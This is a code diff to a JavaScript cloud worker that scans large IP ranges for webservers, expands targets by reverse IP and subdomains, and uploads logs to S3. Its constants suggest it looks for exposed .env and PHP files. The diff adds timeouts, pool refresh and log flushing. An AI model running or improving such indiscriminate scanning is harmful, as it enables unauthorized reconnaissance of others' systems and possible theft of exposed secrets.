@@ -45,11 +45,13 @@ var MAX_SITE_BATCH = 8;
 var MAX_LIST_ENV = 20;
 var MAX_LIST_PHP = 20;
 var DNS_WORKERS_EC2 = 200;
-var DNS_TIMEOUT_EC2 = 3;
+var DNS_TIMEOUT_EC2 = 6;
 var TOTAL_IPS_PER_CYCLE = 2e4;
 var NUM_CIDR_PER_CYCLE = 6;
 var TOTAL_SLOTS = 2e3;
 var NUM_WORKERS = 8;
+var POOL_REFRESH_CYCLES = 10;
+var SCAN_TIMEOUT_MS = 8e3;
 var s3Client = new S3Client({
   region: S3_REGION,
   credentials: { accessKeyId: S3_ACCESS_KEY, secretAccessKey: S3_SECRET_KEY },
@@ -93,10 +95,29 @@ async function asyncPool(concurrency, items, fn) {
 var TeeLogger = class {
   constructor(filepath) {
     this.logfile = fs.createWriteStream(filepath, { flags: "a" });
+    this._fd = null;
+    this.logfile.on("open", (fd) => {
+      this._fd = fd;
+    });
+    this._flushTimer = setInterval(() => {
+      if (this._fd !== null) {
+        fs.fsync(this._fd, () => {
+        });
+      }
+    }, 2e3);
+    this._flushTimer.unref();
   }
   write(msg) {
     process.stdout.write(msg);
     this.logfile.write(msg);
+  }
+  // Cleanup: flush finale + stop timer
+  destroy() {
+    clearInterval(this._flushTimer);
+    if (this._fd !== null) {
+      fs.fsyncSync(this._fd);
+    }
+    this.logfile.end();
   }
 };
 async function uploadFileToS3(localPath, remotePath, maxRetries = 3) {
@@ -677,6 +698,12 @@ async function processUrls(urlsList, isFallback = false) {
     }
   }
 }
+async function processUrlsWithTimeout(urlsList, isFallback = false, timeoutMs = SCAN_TIMEOUT_MS) {
+  return Promise.race([
+    processUrls(urlsList, isFallback),
+    new Promise((_, reject) => setTimeout(() => reject(new Error(`TIMEOUT ${timeoutMs}ms`)), timeoutMs))
+  ]);
+}
 async function doReverseAndSubdomains(siteLink, isFallback) {
   if (!USE_REV || isFallback) return;
   let hostxxx;
@@ -696,7 +723,7 @@ async function doReverseAndSubdomains(siteLink, isFallback) {
       if (filtered.length > 0) {
         log(`  [REV] IP ${hostxxx} \u2014 found ${filtered.length} domains`);
         for (const d of filtered) log(`    [REV] => ${d}`);
-        await processUrls(filtered, true);
+        await processUrlsWithTimeout(filtered, true).catch((e) => log(`  [REV] Timeout/error scanning domains: ${e.message}`));
       } else {
         log(`  [REV] IP ${hostxxx} \u2014 filtered (all self-referential)`);
       }
@@ -713,7 +740,7 @@ async function doReverseAndSubdomains(siteLink, isFallback) {
       if (domains.length > 0) {
         log(`  [REV] Domain ${targetDomain} \u2014 found ${domains.length} subdomains`);
         for (const d of domains) log(`    [REV] => ${d}`);
-        await processUrls(domains, true);
+        await processUrlsWithTimeout(domains, true).catch((e) => log(`  [REV] Timeout/error scanning subdomains: ${e.message}`));
       }
     } else {
       log(`  [REV] No subdomains, trying reverse IP for ${hostxxx}...`);
@@ -727,7 +754,7 @@ async function doReverseAndSubdomains(siteLink, isFallback) {
             if (revDomains.length > 0) {
               log(`  [REV] IP ${targetIp} \u2014 found ${revDomains.length} domains`);
               for (const d of revDomains) log(`    [REV] => ${d}`);
-              await processUrls(revDomains, true);
+              await processUrlsWithTimeout(revDomains, true).catch((e) => log(`  [REV] Timeout/error scanning revDomains: ${e.message}`));
             }
           }
         }
@@ -900,7 +927,7 @@ async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
   log(`[W${workerId} GATHER #${cycleNum}] Phase 1: ${hits} webservers, ${processed - hits} discarded out of ${totalMy} IPs`);
   if (urls.length > 0) {
     log(`[W${workerId}] Phase 2 \u2014 Scanning ${urls.length} verified URLs...`);
-    await processUrls(urls);
+    await processUrlsWithTimeout(urls).catch((e) => log(`[W${workerId}] Phase 2 \u2014 Timeout/error: ${e.message}`));
     log(`[W${workerId}] Phase 2 completed.`);
   } else {
     log(`[W${workerId}] No URLs found. Skipping scan.`);
@@ -908,6 +935,7 @@ async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum) {
 }
 var cidrPoolShared = null;
 var scannedUrlsGlobal = /* @__PURE__ */ new Set();
+var _globalCycleCount = 0;
 async function initCidrPool() {
   if (!LOAD_FROM_CIDR) return null;
   try {
@@ -942,14 +970,27 @@ async function workerLoop(workerId) {
         }
         const fname = path.basename(filepath);
         log(`[SITE] Worker ${workerId} \u2014 Scanning ${fname}: ${targets.length} targets`);
-        await processUrls(targets);
+        await processUrlsWithTimeout(targets).catch((e) => log(`[SITE] Timeout/error scanning ${fname}: ${e.message}`));
         await deleteSiteFile(filepath);
         filesProcessed++;
       }
     }
     if (LOAD_FROM_CIDR && cidrPoolShared) {
-      await gatherAndScanCycle(cidrPoolShared, workerId, NUM_WORKERS, cycle);
-      log(`[W${workerId}] Cycle #${cycle} completed.`);
+      _globalCycleCount++;
+      if (_globalCycleCount % POOL_REFRESH_CYCLES === 0) {
+        log(`[SYS] Refreshing CIDR pool (cycle #${cycle})...`);
+        const newPool = await initCidrPool();
+        if (newPool) {
+          cidrPoolShared = newPool;
+          log(`[SYS] CIDR pool refreshed: ${cidrPoolShared.length} CIDRs`);
+        }
+      }
+      try {
+        await gatherAndScanCycle(cidrPoolShared, workerId, NUM_WORKERS, cycle);
+        log(`[W${workerId}] Cycle #${cycle} completed.`);
+      } catch (e) {
+        log(`[W${workerId}] Cycle #${cycle} crashed: ${e.message}. Restarting next cycle...`);
+      }
     }
     if (LOAD_FROM_SITE && !LOAD_FROM_CIDR) {
       log(`[SYS] Worker ${workerId} \u2014 Done. No CIDR active, exiting.`);
@@ -965,17 +1006,25 @@ function startLogUploadLoop() {
     });
   }, LOG_UPLOAD_INTERVAL * 1e3);
 }
+var _tee = null;
 async function main() {
   if (LOG_ACTIVE) {
     await fs.promises.mkdir(LOGS_DIR, { recursive: true });
     const containerId = process.env.HOSTNAME || `local_${Math.floor(Date.now() / 1e3)}`;
     LOG_PATH = path.join(LOGS_DIR, `${containerId}.log`);
-    const tee = new TeeLogger(LOG_PATH);
+    _tee = new TeeLogger(LOG_PATH);
     console.log = (...args) => {
       const msg = args.map((a) => typeof a === "string" ? a : JSON.stringify(a)).join(" ") + "\n";
-      tee.write(msg);
+      _tee.write(msg);
     };
     console.error = console.log;
+    const shutdown = (sig) => {
+      console.log(`[SYS] Received ${sig}, flushing logs...`);
+      _tee.destroy();
+      process.exit(0);
+    };
+    process.on("SIGTERM", () => shutdown("SIGTERM"));
+    process.on("SIGINT", () => shutdown("SIGINT"));
   }
   log("\n[SYS] Cloud worker starting...");
   if (LOG_ACTIVE) log(`[SYS] Log saved to: ${LOG_PATH}`);
